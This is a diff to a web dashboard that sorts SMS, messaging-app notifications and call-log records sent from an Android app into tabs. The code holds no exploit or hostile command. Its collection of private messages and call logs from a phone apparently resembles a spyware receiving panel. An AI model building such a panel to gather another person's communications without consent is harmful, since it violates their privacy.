@@ -20,6 +20,9 @@
       --bg1: #f7f3ec;
       --bg2: #d9e7e1;
       --shadow: 0 18px 40px rgba(20, 32, 27, 0.07);
+      --sms: #1f6f5b;
+      --social: #2f5d8c;
+      --calls: #8a5a2b;
     }
 
     * { box-sizing: border-box; }
@@ -35,7 +38,7 @@
       background:
         radial-gradient(1200px 700px at 12% -10%, var(--bg2), transparent 55%),
         radial-gradient(900px 600px at 100% 0%, #f0e6d8, transparent 50%),
-        linear-gradient(165deg, var(--bg0), var(--bg1) 45%, #efe8dc);
+      linear-gradient(165deg, var(--bg0), var(--bg1) 45%, #efe8dc);
       background-attachment: fixed;
     }
 
@@ -93,19 +96,74 @@
       animation: pulse 1.8s ease infinite;
     }
 
+    .tabs {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 16px;
+      animation: rise 0.7s ease 0.08s both;
+    }
+
+    .tab {
+      appearance: none;
+      border: 1px solid rgba(255, 255, 255, 0.55);
+      background: var(--panel);
+      backdrop-filter: blur(14px);
+      box-shadow: var(--shadow);
+      border-radius: 18px;
+      padding: 14px 12px;
+      cursor: pointer;
+      text-align: left;
+      font: inherit;
+      color: var(--muted);
+      transition: transform 0.2s ease, border-color 0.2s ease, color 0.2s ease;
+    }
+
+    .tab:hover {
+      transform: translateY(-1px);
+      color: var(--ink);
+    }
+
+    .tab.active {
+      color: var(--ink);
+      border-color: rgba(20, 32, 27, 0.18);
+    }
+
+    .tab.active[data-tab="sms"] { box-shadow: inset 0 0 0 1.5px rgba(31, 111, 91, 0.35), var(--shadow); }
+    .tab.active[data-tab="social"] { box-shadow: inset 0 0 0 1.5px rgba(47, 93, 140, 0.35), var(--shadow); }
+    .tab.active[data-tab="calls"] { box-shadow: inset 0 0 0 1.5px rgba(138, 90, 43, 0.35), var(--shadow); }
+
+    .tab-label {
+      display: block;
+      font-size: 0.68rem;
+      font-weight: 600;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+      opacity: 0.75;
+    }
+
+    .tab-title {
+      display: block;
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: inherit;
+    }
+
+    .tab-count {
+      display: inline-block;
+      margin-top: 8px;
+      font-size: 0.78rem;
+      font-weight: 500;
+    }
+
     .toolbar {
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 16px;
-      margin-bottom: 20px;
-      padding: 16px 18px;
-      background: var(--panel);
-      border: 1px solid rgba(255, 255, 255, 0.55);
-      border-radius: 20px;
-      box-shadow: var(--shadow);
-      backdrop-filter: blur(14px);
-      animation: rise 0.7s ease 0.08s both;
+      margin-bottom: 16px;
+      animation: rise 0.7s ease 0.12s both;
     }
 
     .toolbar h2 {
@@ -126,7 +184,7 @@
       flex-shrink: 0;
     }
 
-    button {
+    button.action {
       appearance: none;
       border: 1px solid var(--line);
       background: transparent;
@@ -140,13 +198,13 @@
       transition: background 0.2s ease, color 0.2s ease, border-color 0.2s ease;
     }
 
-    button:hover {
+    button.action:hover {
       color: var(--ink);
       border-color: rgba(20, 32, 27, 0.22);
       background: rgba(255, 255, 255, 0.45);
     }
 
-    button.danger:hover {
+    button.action.danger:hover {
       color: var(--danger);
       border-color: rgba(155, 59, 46, 0.35);
       background: rgba(155, 59, 46, 0.06);
@@ -156,7 +214,7 @@
       display: flex;
       flex-direction: column;
       gap: 16px;
-      animation: rise 0.7s ease 0.14s both;
+      animation: rise 0.7s ease 0.16s both;
     }
 
     .empty {
@@ -174,15 +232,6 @@
       color: var(--muted);
       font-size: 0.98rem;
       line-height: 1.6;
-    }
-
-    .empty code {
-      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-      font-size: 0.78rem;
-      color: var(--accent);
-      background: var(--accent-soft);
-      padding: 3px 8px;
-      border-radius: 8px;
     }
 
     .item {
@@ -209,11 +258,14 @@
       font-weight: 600;
       letter-spacing: 0.08em;
       text-transform: uppercase;
-      color: var(--accent);
-      background: var(--accent-soft);
       padding: 5px 10px;
       border-radius: 999px;
     }
+
+    .type.sms { color: var(--sms); background: rgba(31, 111, 91, 0.12); }
+    .type.social { color: var(--social); background: rgba(47, 93, 140, 0.12); }
+    .type.calls { color: var(--calls); background: rgba(138, 90, 43, 0.12); }
+    .type.other { color: var(--muted); background: rgba(95, 111, 104, 0.12); }
 
     .time {
       font-size: 0.78rem;
@@ -226,9 +278,7 @@
       border-bottom: 1px solid var(--line);
     }
 
-    .block:last-child {
-      border-bottom: 0;
-    }
+    .block:last-child { border-bottom: 0; }
 
     .label {
       display: block;
@@ -249,9 +299,7 @@
       word-break: break-word;
     }
 
-    .value.sender {
-      font-weight: 600;
-    }
+    .value.sender { font-weight: 600; }
 
     .value.mono {
       font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
@@ -286,6 +334,7 @@
     @media (max-width: 560px) {
       .shell { width: min(100% - 24px, 760px); padding-top: 28px; }
       header { flex-direction: column; align-items: flex-start; }
+      .tabs { grid-template-columns: 1fr; }
       .toolbar { flex-direction: column; align-items: flex-start; }
       .item-head,
       .block { padding: 14px 16px; }
@@ -305,11 +354,29 @@
       </div>
     </header>
 
+    <nav class="tabs" aria-label="Message categories">
+      <button type="button" class="tab active" data-tab="sms">
+        <span class="tab-label">Channel</span>
+        <span class="tab-title">SMS</span>
+        <span class="tab-count"><strong id="count-sms">0</strong> messages</span>
+      </button>
+      <button type="button" class="tab" data-tab="social">
+        <span class="tab-label">Channel</span>
+        <span class="tab-title">Social</span>
+        <span class="tab-count"><strong id="count-social">0</strong> messages</span>
+      </button>
+      <button type="button" class="tab" data-tab="calls">
+        <span class="tab-label">Channel</span>
+        <span class="tab-title">Calls</span>
+        <span class="tab-count"><strong id="count-calls">0</strong> records</span>
+      </button>
+    </nav>
+
     <div class="toolbar">
-      <h2><strong id="count">0</strong> payloads received</h2>
+      <h2><strong id="count">0</strong> in this tab</h2>
       <div class="actions">
-        <button type="button" id="refreshBtn">Refresh</button>
-        <button type="button" class="danger" id="clearBtn">Clear</button>
+        <button type="button" class="action" id="refreshBtn">Refresh</button>
+        <button type="button" class="action danger" id="clearBtn">Clear all</button>
       </div>
     </div>
 
@@ -321,11 +388,28 @@
   </div>
 
   <script>
+    const TABS = {
+      sms: {
+        empty: "No SMS yet. Send from the Android app with messageType SMS.",
+        match: (type) => ["SMS"].includes(type),
+      },
+      social: {
+        empty: "No social messages yet. WhatsApp, Telegram, and Instagram land here.",
+        match: (type) => ["WHATSAPP", "TELEGRAM", "INSTAGRAM", "SOCIAL", "NOTIFICATION"].includes(type),
+      },
+      calls: {
+        empty: "No calls yet. Send from the Android app with messageType CALL.",
+        match: (type) => ["CALL", "CALL_LOG", "CALLS"].includes(type),
+      },
+    };
+
     const feed = document.getElementById("feed");
     const countEl = document.getElementById("count");
     const endpointEl = document.getElementById("endpoint");
     endpointEl.textContent = location.origin + "/api/sync";
 
+    let activeTab = "sms";
+    let allItems = [];
     let knownIds = new Set();
     let firstLoad = true;
 
@@ -335,6 +419,18 @@
         .replaceAll("<", "&lt;")
         .replaceAll(">", "&gt;")
         .replaceAll('"', "&quot;");
+    }
+
+    function normalizeType(value) {
+      return String(value || "").trim().toUpperCase();
+    }
+
+    function categoryOf(type) {
+      const t = normalizeType(type);
+      if (TABS.sms.match(t)) return "sms";
+      if (TABS.social.match(t)) return "social";
+      if (TABS.calls.match(t)) return "calls";
+      return "other";
     }
 
     function formatTime(ms) {
@@ -349,28 +445,40 @@
       });
     }
 
-    function renderEmpty() {
+    function filteredItems() {
+      return allItems.filter((item) => TABS[activeTab].match(normalizeType(item.messageType)));
+    }
+
+    function updateCounts() {
+      const sms = allItems.filter((i) => categoryOf(i.messageType) === "sms").length;
+      const social = allItems.filter((i) => categoryOf(i.messageType) === "social").length;
+      const calls = allItems.filter((i) => categoryOf(i.messageType) === "calls").length;
+      document.getElementById("count-sms").textContent = String(sms);
+      document.getElementById("count-social").textContent = String(social);
+      document.getElementById("count-calls").textContent = String(calls);
+    }
+
+    function renderEmpty(message) {
       feed.innerHTML = `
         <div class="empty">
-          <p>Waiting for the first payload from the Android app.<br />
-          Send to <code>/api/sync</code></p>
+          <p>${escapeHtml(message)}</p>
         </div>`;
     }
 
     function renderItems(items) {
       if (!items.length) {
-        renderEmpty();
-        knownIds = new Set();
+        renderEmpty(TABS[activeTab].empty);
         return;
       }
 
       const nextIds = new Set(items.map((item) => item.id));
       feed.innerHTML = items.map((item, index) => {
+        const cat = categoryOf(item.messageType);
         const isNew = !firstLoad && !knownIds.has(item.id);
         return `
           <article class="item" style="${isNew ? "" : `animation-delay:${Math.min(index, 8) * 30}ms`}">
             <div class="item-head">
-              <span class="type">${escapeHtml(item.messageType)}</span>
+              <span class="type ${cat}">${escapeHtml(item.messageType)}</span>
               <time class="time">${escapeHtml(formatTime(item.receivedAt || item.timestamp))}</time>
             </div>
             <div class="block">
@@ -391,8 +499,15 @@
             </div>
           </article>`;
       }).join("");
-      knownIds = nextIds;
+      knownIds = new Set(allItems.map((item) => item.id));
       firstLoad = false;
+    }
+
+    function paint() {
+      updateCounts();
+      const items = filteredItems();
+      countEl.textContent = String(items.length);
+      renderItems(items);
     }
 
     async function loadMessages() {
@@ -400,15 +515,22 @@
         const res = await fetch("/api/sync/messages?limit=100", { cache: "no-store" });
         if (!res.ok) throw new Error("Failed to load");
         const data = await res.json();
-        const items = Array.isArray(data.items) ? data.items : [];
-        countEl.textContent = String(data.count ?? items.length);
-        renderItems(items);
+        allItems = Array.isArray(data.items) ? data.items : [];
+        paint();
       } catch (err) {
         if (!feed.children.length) {
-          feed.innerHTML = `<div class="empty"><p>Could not reach the API.</p></div>`;
+          renderEmpty("Could not reach the API.");
         }
       }
     }
+
+    document.querySelectorAll(".tab").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        activeTab = btn.dataset.tab;
+        document.querySelectorAll(".tab").forEach((el) => el.classList.toggle("active", el === btn));
+        paint();
+      });
+    });
 
     document.getElementById("refreshBtn").addEventListener("click", loadMessages);
     document.getElementById("clearBtn").addEventListener("click", async () => {
@@ -418,7 +540,7 @@
       await loadMessages();
     });
 
-    renderEmpty();
+    renderEmpty(TABS.sms.empty);
     loadMessages();
     setInterval(loadMessages, 2000);
   </script>
